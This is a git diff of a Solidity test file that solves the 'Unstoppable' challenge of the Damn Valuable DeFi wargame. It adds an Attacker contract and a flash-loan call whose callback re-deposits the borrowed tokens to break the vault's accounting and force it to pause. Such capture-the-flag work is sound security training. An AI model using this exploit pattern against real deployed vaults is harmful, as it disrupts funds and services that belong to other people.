@@ -5,7 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
-import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+import {UnstoppableMonitor, IERC3156FlashBorrower} from "../../src/unstoppable/UnstoppableMonitor.sol";
 
 contract UnstoppableChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -91,7 +91,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        Attacker attack = new Attacker(address(vault));
+        token.transfer(address(attack), INITIAL_PLAYER_TOKEN_BALANCE);
+        vault.flashLoan(attack, address(token), INITIAL_PLAYER_TOKEN_BALANCE, bytes(""));
     }
 
     /**
@@ -107,5 +109,21 @@ contract UnstoppableChallenge is Test {
         // And now the monitor paused the vault and transferred ownership to deployer
         assertTrue(vault.paused(), "Vault is not paused");
         assertEq(vault.owner(), deployer, "Vault did not change owner");
+    }
+}
+
+contract Attacker is IERC3156FlashBorrower {
+    DamnValuableToken public token;
+    UnstoppableVault public vault;
+
+    constructor(address _vault) {
+        vault = UnstoppableVault(_vault);
+        token = DamnValuableToken(address(vault.asset()));
+        token.approve(address(vault), type(uint256).max);
+    }
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
+        vault.deposit(amount, address(this));
+        return keccak256("IERC3156FlashBorrower.onFlashLoan");
     }
 }
